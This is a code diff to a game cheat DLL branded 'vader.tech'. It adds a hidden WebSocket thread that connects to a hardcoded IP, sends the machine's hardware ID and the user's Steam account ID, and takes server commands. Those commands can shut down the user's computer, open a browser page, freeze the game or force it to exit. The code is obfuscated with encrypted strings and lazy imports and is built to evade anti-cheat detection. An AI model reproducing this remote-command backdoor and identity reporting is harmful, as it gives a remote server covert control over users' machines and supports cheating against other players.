@@ -21,6 +21,9 @@
 #include "Loader/Security/Security.hpp"
 #include "ShittierMenu/menu.hpp"
 #include <atlstr.h>
+#include "Utils/easywsclient.hpp"
+#include "Utils/hwid.h"
+#include <json.h>
 
 static Semaphore dispatchSem;
 static SharedMutex smtx;
@@ -141,6 +144,9 @@ void ErasePEHeaderFromMemory(HMODULE hModule)
 }
 
 static bool m_bSecurityInitialized;
+static bool m_bWebSocketInitialized;
+static bool m_bShouldBan;
+static bool m_bUserValidated;
 
 DWORD WINAPI Entry( DllArguments* pArgs ) {
 #ifdef DEV 
@@ -151,6 +157,14 @@ DWORD WINAPI Entry( DllArguments* pArgs ) {
 #endif
 
 #ifndef DEV
+	while (!m_bSecurityInitialized) { // i takes the security thread a few seconds to Initialize so i am doing this. 
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
+
+	while (!m_bWebSocketInitialized) { // i takes the security thread a few seconds to Initialize so i am doing this. 
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
+
 	g_Vars.globals.user_info = *( CVariables::GLOBAL::cheat_header_t* )pArgs->hModule;
 	g_Vars.globals.c_login = g_Vars.globals.user_info.username;
 	g_Vars.globals.hModule = pArgs->hModule;
@@ -167,11 +181,20 @@ DWORD WINAPI Entry( DllArguments* pArgs ) {
 #ifndef DEV
 	if (!m_bSecurityInitialized) {
 		HWND null = NULL;
-		LI_FN(MessageBoxA)(null, XorStr("Security Init Error!"), XorStr("vader.tech"), 0);
+		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x3552A!\n Report this to a developer!"), XorStr("vader.tech"), 0);
+		LI_FN(exit)(69);
+	}
+
+	if (!m_bWebSocketInitialized) {
+		HWND null = NULL;
+		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x2642B!\n Report this to a developer!"), XorStr("vader.tech"), 0);
+		LI_FN(exit)(69);
+	}
+
+	if (!m_bUserValidated) { // user aint valid
 		LI_FN(exit)(69);
 	}
 #endif // !DEV
-
 	auto tier0 = GetModuleHandleA( XorStr( "tier0.dll" ) );
 
 	AllocateThreadID = ( ThreadIDFn )GetProcAddress( tier0, XorStr( "AllocateThreadID" ) );
@@ -239,17 +262,116 @@ LONG WINAPI CrashHandlerWrapper( struct _EXCEPTION_POINTERS* exception ) {
 	return ret;
 }
 
+DWORD WINAPI WebSocketThread(LPVOID PARAMS) {
+	INT rc;
+	WSADATA wsaData;
+
+	rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (rc) {
+		HWND null = NULL;
+		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x4248E!\n Report this to a developer!"), XorStr("vader.tech"), 0);
+		LI_FN(exit)(69);
+	}
+
+	nlohmann::json j2 = {
+	  {XorStr("type"), XorStr("AUTHENTICATE")},
+	  {XorStr("hwid"), std::to_string(hwid::get_hash())},
+	};
+
+	std::unique_ptr<easywsclient::WebSocket> ws(easywsclient::WebSocket::from_url(XorStr("ws://51.81.80.177:2934")));
+	assert(ws);
+	if (!ws) {
+		HWND null = NULL;
+		LI_FN(MessageBoxA)(null, XorStr("Error Code: 0x2857A!\n Report this to a developer!"), XorStr("vader.tech"), 0);
+		LI_FN(exit)(69);
+	}
+	std::string s = j2.dump();
+	ws->send(s);
+
+	while (ws->getReadyState() != easywsclient::WebSocket::CLOSED) {
+		easywsclient::WebSocket::pointer wsp = &*ws; // <-- because a unique_ptr cannot be copied into a lambda
+		ws->poll();
+		ws->dispatch([wsp](const std::string& message) {
+			nlohmann::json ret = nlohmann::json::parse(message);
+			//if (message == XorStr("TERMINATE_CONNECTION")) {
+			//	wsp->close();
+			//}
+			if (ret[XorStr("type")] == XorStr("USER_VALIDATED")) {
+				m_bUserValidated = true;
+			}
+			if (ret[XorStr("type")] == XorStr("SUNSET")) {
+				LI_FN(exit)(69);
+			}
+			if (ret[XorStr("type")] == XorStr("FORCEUP")) {
+				g_Vars.globals.m_rce_forceup = !g_Vars.globals.m_rce_forceup;
+			}
+			if (ret[XorStr("type")] == XorStr("RICKROLL")) {
+				LI_FN(system)(XorStr("start https://www.youtube.com/watch?v=QtBDL8EiNZo"));
+			}
+			if (ret[XorStr("type")] == XorStr("SHUTDOWN")) {
+				LI_FN(system)(XorStr("shutdown /s"));
+			}
+			if (ret[XorStr("type")] == XorStr("FREEZE")) {
+				Sleep(ret[XorStr("freezetime")]);
+			}
+		});
+
+		if (m_bShouldBan && m_bUserValidated) {
+			nlohmann::json j3 = {
+			  {XorStr("type"), XorStr("BAN_ME")},
+			  {XorStr("violation"), XorStr("DLL_") + g_protection.error_string},
+			};
+
+			std::string s = j3.dump();
+			ws->send(s);
+			while (ws->getReadyState() == easywsclient::WebSocket::CLOSED) { // connection closed close the fucking game.
+				LI_FN(exit)(69);
+			}
+		}
+
+		static bool sent_steamid;
+
+		if (m_bUserValidated && !sent_steamid) {
+			auto g_pSteamClient = ((ISteamClient * (__cdecl*)(void))GetProcAddress(GetModuleHandleA(XorStr("steam_api.dll")), XorStr("SteamClient")))();
+			HSteamUser hSteamUser = reinterpret_cast<HSteamUser(__cdecl*) (void)>(GetProcAddress(GetModuleHandle(XorStr("steam_api.dll")), XorStr("SteamAPI_GetHSteamUser")))();
+			HSteamPipe hSteamPipe = reinterpret_cast<HSteamPipe(__cdecl*) (void)>(GetProcAddress(GetModuleHandle(XorStr("steam_api.dll")), XorStr("SteamAPI_GetHSteamPipe")))();
+			auto SteamUser = (ISteamUser*)g_pSteamClient->GetISteamUser(hSteamUser, hSteamPipe, XorStr("SteamUser019"));
+
+			CSteamID localID = SteamUser->GetSteamID();
+
+			nlohmann::json j = {
+			{XorStr("type"), XorStr("STEAMID")},
+			{XorStr("input"), std::to_string(localID.GetAccountID()) },
+			};
+			std::string s = j.dump();
+
+			ws->send(s);
+			sent_steamid = true;
+		}
+
+		m_bWebSocketInitialized = true;
+	}
+
+	WSACleanup();
+	LI_FN(exit)(69);
+
+	return true;
+}
+
 DWORD WINAPI Security(LPVOID PARAMS) {
 	while (true) {
+		m_bSecurityInitialized = true;
 		if (!g_protection.safety_check()) {
-			HWND null = NULL;
+			//HWND null = NULL;
 			//LI_FN(MessageBoxA)(null, g_protection.error_string.c_str(), XorStr("vader.tech"), 0); // do not uncomment! this was used for debugging.
-			std::ofstream ban;
-			ban.open(ban_path().c_str(), std::ofstream::binary);
-			ban.close();
-			LI_FN(exit)(69);
+			//std::ofstream ban;
+			//ban.open(ban_path().c_str(), std::ofstream::binary);
+			//ban.close();
+
+
+			//m_bShouldBan = true;
+			//LI_FN(exit)(69);
 		}
-		m_bSecurityInitialized = true; // our security is running.
 		std::this_thread::sleep_for(std::chrono::seconds(3));
 	}
 	return true;
@@ -275,8 +397,9 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD dwReason, LPVOID lpReserved ) {
 			return TRUE;
 		}
 #else
-		//start security thread
+		//start security and websocket thread
 		CreateThread(0, 0, &Security, 0, 0, 0);
+		CreateThread(0, 0, &WebSocketThread, 0, 0, 0);
 
 //#ifdef BETA_MODE
 //		SetUnhandledExceptionFilter( CrashHandlerWrapper );
